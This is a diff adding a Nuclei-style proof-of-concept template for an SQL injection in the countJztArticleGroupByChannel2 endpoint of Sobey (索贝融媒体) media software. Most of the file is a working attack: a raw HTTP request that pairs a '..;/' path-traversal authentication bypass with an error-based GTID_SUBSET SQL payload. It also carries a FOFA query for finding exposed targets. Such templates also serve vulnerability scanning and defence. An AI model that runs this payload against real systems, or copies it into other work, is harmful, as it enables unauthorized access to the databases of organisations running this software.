@@ -1,0 +1,23 @@
+id: poc-brbwn7fc3nugvudl
+info:
+  name: 索贝融媒体 countJztArticleGroupByChannel2 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/brbwn7fc3nugvudl'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: brbwn7fc3nugvudl
+    fofa: header="Sobey"||body="/Sc-TaskMonitoring/"
+http:
+- raw:
+  - 'GET /sobey-mchEditor/js/..;/mch/Jzt/statistics/countJztArticleGroupByChannel2?siteCode=&token=&userCode=admin&channelId=1&catalogid=1&channelId=1+AND+GTID_SUBSET%28CONCAT%280x7e%2C%28SELECT+%28ELT%281709%3D1709%2C1%29%29%29%2Cmd5%281%29%29%2C1709%29 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
